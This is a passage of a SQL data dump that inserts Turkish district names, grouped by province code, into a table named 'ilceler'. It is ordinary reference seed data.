INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '637', '48', 'Datça' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '638', '48', 'Fethiye' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '639', '48', 'Kavaklidere' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '640', '48', 'Köycegiz' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '641', '48', 'Marmaris' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '642', '48', 'Milas' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '643', '48', 'Ortaca' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '644', '48', 'Ula' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '645', '48', 'Yatagan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '646', '49', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '647', '49', 'Bulanik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '648', '49', 'Hasköy' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '649', '49', 'Korkut' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '650', '49', 'Malazgirt' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '651', '49', 'Varto' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '652', '50', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '653', '50', 'Acigöl' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '654', '50', 'Avanos' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '655', '50', 'Derinkuyu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '656', '50', 'Gülsehir' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '657', '50', 'Hacibektas' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '658', '50', 'Kozakli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '659', '50', 'Ürgüp' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '660', '51', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '661', '51', 'Altunhisar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '662', '51', 'Bor' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '663', '51', 'Çamardi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '664', '51', 'Çiftlik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '665', '51', 'Ulukisla' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '666', '52', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '667', '52', 'Akkus' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '668', '52', 'Aybasti' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '669', '52', 'Çamas' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '670', '52', 'Çatalpinar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '671', '52', 'Çaybasi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '672', '52', 'Fatsa' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '673', '52', 'Gölköy' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '674', '52', 'Gölyali' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '675', '52', 'Gürgentepe' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '676', '52', 'Ikizce' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '677', '52', 'Korgan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '678', '52', 'Kabadüz' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '679', '52', 'Kabatas' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '680', '52', 'Kumru' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '681', '52', 'Mesudiye' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '682', '52', 'Persembe' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '683', '52', 'Ulubey' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '684', '52', 'Ünye' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '685', '53', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '686', '53', 'Ardesen' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '687', '53', 'Çamlihemsin' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '688', '53', 'Çayeli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '689', '53', 'Derepazari' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '690', '53', 'Findikli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '691', '53', 'Güneysu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '692', '53', 'Hemsin' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '693', '53', 'Ikizdere' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '694', '53', 'Iyidere' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '695', '53', 'Kalkandere' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '696', '53', 'Pazar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '697', '54', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '698', '54', 'Akyazi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '699', '54', 'Ferizli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '700', '54', 'Geyve' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '701', '54', 'Hendek' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '702', '54', 'Karapürçek' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '703', '54', 'Karasu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '704', '54', 'Kaynarca' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '705', '54', 'Kocaali' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '706', '54', 'Pamukova' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '707', '54', 'Sapanca' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '708', '54', 'Sögütlü' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '709', '54', 'Tarakli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '710', '55', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '711', '55', 'Alaçam' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '712', '55', 'Asarcik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '713', '55', 'Ayvacik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '714', '55', 'Bafra' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '715', '55', 'Çarsamba' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '716', '55', 'Havza' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '717', '55', 'Kavak' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '718', '55', 'Ladik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '719', '55', '19mayis' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '720', '55', 'Salipazari' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '721', '55', 'Tekkeköy' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '722', '55', 'Terme' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '723', '55', 'Vezirköprü' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '724', '55', 'Yakakent' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '725', '56', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '726', '56', 'Aydinlar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '727', '56', 'Baykan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '728', '56', 'Eruh' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '729', '56', 'Kozluk' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '730', '56', 'Kurtalan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '731', '56', 'Pervari' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '732', '56', 'Sirvan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '733', '57', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '734', '57', 'Ayancik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '735', '57', 'Boyabat' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '736', '57', 'Dikmen' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '737', '57', 'Duragan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '738', '57', 'Erfelek' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '739', '57', 'Gerze' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '740', '57', 'Saraydüzü' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '741', '57', 'Türkeli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '742', '58', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '743', '58', 'Akincilar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '744', '58', 'Altinyayla' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '745', '58', 'Divrigi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '746', '58', 'Dogansar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '747', '58', 'Gemerek' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '748', '58', 'Gölova' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '749', '58', 'Gürün' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '750', '58', 'Hafik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '751', '58', 'Imranli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '752', '58', 'Kangal' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '753', '58', 'Koyulhisar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '754', '58', 'Susehri' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '755', '58', 'Sarkisla' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '756', '58', 'Ulas' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '757', '58', 'Yildizeli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '758', '58', 'Zara' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '759', '59', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '760', '59', 'Çerkezköy' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '761', '59', 'Çorlu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '762', '59', 'Hayrabolu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '763', '59', 'Malkara' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '764', '59', 'Marmaraeregli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '765', '59', 'Muratli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '766', '59', 'Saray' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '767', '59', 'Sarköy' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '768', '60', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '769', '60', 'Almus' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '770', '60', 'Artova' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '771', '60', 'Basçiftlik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '772', '60', 'Erbaa' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '773', '60', 'Niksar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '774', '60', 'Pazar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '775', '60', 'Resadiye' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '776', '60', 'Sulusaray' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '777', '60', 'Turhal' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '778', '60', 'Yesilyurt' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '779', '60', 'Zile' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '780', '61', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '781', '61', 'Akçaabat' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '782', '61', 'Arakli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '783', '61', 'Arsin' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '784', '61', 'Besikdüzü' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '785', '61', 'Çarsibasi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '786', '61', 'Çaykara' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '787', '61', 'Dernekpazar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '788', '61', 'Düzköy' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '789', '61', 'Hayrat' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '790', '61', 'Köprübasi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '791', '61', 'Maçka' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '792', '61', 'Of' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '793', '61', 'Sürmene' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '794', '61', 'Salpazari' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '795', '61', 'Tonya' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '796', '61', 'Vakfikebir' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '797', '61', 'Yomra' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '798', '62', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '799', '62', 'Çemisgezek' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '800', '62', 'Hozat' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '801', '62', 'Mazgirt' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '802', '62', 'Nazimiye' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '803', '62', 'Ovacik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '804', '62', 'Pertek' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '805', '62', 'Pülümür' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '806', '63', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '807', '63', 'Akçakale' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '808', '63', 'Birecik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '809', '63', 'Bozova' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '810', '63', 'Ceylanpinar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '811', '63', 'Halfeti' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '812', '63', 'Harran' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '813', '63', 'Hilvan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '814', '63', 'Siverek' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '815', '63', 'Suruç' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '816', '63', 'Viransehir' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '817', '64', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '818', '64', 'Banaz' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '819', '64', 'Esme' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '820', '64', 'Karahalli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '821', '64', 'Sivasli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '822', '64', 'Ulubey' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '823', '65', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '824', '65', 'Bahçesaray' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '825', '65', 'Baskale' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '826', '65', 'Çaldiran' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '827', '65', 'Çatak' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '828', '65', 'Edremit' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '829', '65', 'Ercis' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '830', '65', 'Gevas' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '831', '65', 'Gürpinar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '832', '65', 'Muradiye' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '833', '65', 'Özalp' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '834', '65', 'Saray' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '835', '66', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '836', '66', 'Akdagmadeni' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '837', '66', 'Aydincik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '838', '66', 'Bogazliyan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '839', '66', 'Çandir' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '840', '66', 'Çayiralan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '841', '66', 'Çekerek' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '842', '66', 'Kadisehri' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '843', '66', 'Sarikaya' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '844', '66', 'Saraykent' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '845', '66', 'Sorgun' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '846', '66', 'Sefaatli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '847', '66', 'Yenifakili' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '848', '66', 'Yerköy' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '849', '67', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '850', '67', 'Alapli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '851', '67', 'Çamoluk' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '852', '67', 'Çaycuma' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '853', '67', 'Devrek' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '854', '67', 'Eflani' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '855', '67', 'Eregli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '856', '67', 'Gökçebey' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '857', '68', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '858', '68', 'Agaçören' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '859', '68', 'Eskil' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '860', '68', 'Gülagaç' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '861', '68', 'Güzelyurt' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '862', '68', 'Ortaköy' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '863', '68', 'Sariyahsi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '864', '69', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '865', '69', 'Aydintepe' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '866', '69', 'Demirözü' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '867', '70', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '868', '70', 'Ayranci' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '869', '70', 'Basyayla' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '870', '70', 'Ermenek' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '871', '70', 'Kazimkarabekir' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '872', '70', 'Sariveliler' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '873', '71', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '874', '71', 'Bahsili' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '875', '71', 'Bagliseyh' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '876', '71', 'Çelebi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '877', '71', 'Delice' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '878', '71', 'Karakeçili' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '879', '71', 'Keskin' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '880', '71', 'Sulakyurt' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '881', '71', 'Yahsihan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '882', '72', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '883', '72', 'Gercüs' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '884', '72', 'Hasankeyf' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '885', '72', 'Besiri' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '886', '72', 'Kozluk' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '887', '72', 'Sason' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '888', '73', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '889', '73', 'Beytüsseba' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '890', '73', 'Uludere' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '891', '73', 'Cizre' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '892', '73', 'Idil' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '893', '73', 'Silopi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '894', '73', 'Güçlükonak' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '895', '74', 'bolum' );
